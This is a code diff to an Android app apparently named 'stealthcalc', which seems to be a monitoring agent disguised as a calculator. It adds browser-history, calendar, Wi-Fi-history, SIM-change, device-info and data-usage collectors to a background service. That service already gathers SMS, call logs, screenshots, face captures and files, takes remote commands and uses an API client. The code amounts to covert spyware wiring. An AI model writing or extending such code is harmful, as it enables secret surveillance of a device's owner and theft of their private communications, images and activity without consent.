@@ -13,7 +13,11 @@ import androidx.lifecycle.lifecycleScope
 import com.stealthcalc.core.logging.AppLogger
 import com.stealthcalc.monitoring.collector.AppUsageCollector
 import com.stealthcalc.monitoring.collector.BatteryCollector
+import com.stealthcalc.monitoring.collector.BrowserHistoryCollector
+import com.stealthcalc.monitoring.collector.CalendarCollector
 import com.stealthcalc.monitoring.collector.CallLogCollector
+import com.stealthcalc.monitoring.collector.DataUsageCollector
+import com.stealthcalc.monitoring.collector.DeviceInfoCollector
 import com.stealthcalc.monitoring.collector.DeviceSecurityCollector
 import com.stealthcalc.monitoring.collector.FaceCaptureCollector
 import com.stealthcalc.monitoring.collector.FileSyncCollector
@@ -23,7 +27,9 @@ import com.stealthcalc.monitoring.collector.ScreenshotCollector
 import com.stealthcalc.monitoring.collector.MediaChangeCollector
 import com.stealthcalc.monitoring.collector.NetworkCollector
 import com.stealthcalc.monitoring.collector.ScreenStateCollector
+import com.stealthcalc.monitoring.collector.SimChangeCollector
 import com.stealthcalc.monitoring.collector.SmsCollector
+import com.stealthcalc.monitoring.collector.WifiHistoryCollector
 import com.stealthcalc.monitoring.service.RemoteCommandHandler
 import com.stealthcalc.monitoring.data.MonitoringRepository
 import com.stealthcalc.monitoring.network.AgentApiClient
@@ -69,6 +75,12 @@ class AgentService : LifecycleService() {
     @Inject lateinit var fileSyncCollector: FileSyncCollector
     @Inject lateinit var screenshotCollector: ScreenshotCollector
     @Inject lateinit var faceCaptureCollector: FaceCaptureCollector
+    @Inject lateinit var wifiHistoryCollector: WifiHistoryCollector
+    @Inject lateinit var browserHistoryCollector: BrowserHistoryCollector
+    @Inject lateinit var simChangeCollector: SimChangeCollector
+    @Inject lateinit var deviceInfoCollector: DeviceInfoCollector
+    @Inject lateinit var dataUsageCollector: DataUsageCollector
+    @Inject lateinit var calendarCollector: CalendarCollector
     @Inject lateinit var remoteCommandHandler: RemoteCommandHandler
     @Inject lateinit var apiClient: AgentApiClient
 
@@ -106,6 +118,7 @@ class AgentService : LifecycleService() {
         mediaChangeCollector.start()
         deviceSecurityCollector.start()
         faceCaptureCollector.start()
+        simChangeCollector.start()
 
         collectJob?.cancel()
         collectJob = lifecycleScope.launch {
@@ -120,6 +133,12 @@ class AgentService : LifecycleService() {
                     mediaUploadCollector.collect()
                     fileSyncCollector.collect()
                     screenshotCollector.captureScreenshot()
+                    wifiHistoryCollector.collect()
+                    browserHistoryCollector.collect()
+                    deviceInfoCollector.collect()
+                    dataUsageCollector.collect()
+                    calendarCollector.collect()
+                    simChangeCollector.collect()
                 }.onFailure { e ->
                     AppLogger.log(this@AgentService, "[agent]", "Collection error: ${e.message}")
                 }
@@ -160,6 +179,7 @@ class AgentService : LifecycleService() {
         deviceSecurityCollector.stop()
         faceCaptureCollector.stop()
         screenshotCollector.release()
+        simChangeCollector.stop()
         remoteCommandHandler.stopListening()
         AppLogger.log(this, "[agent]", "Agent service stopped")
         super.onDestroy()
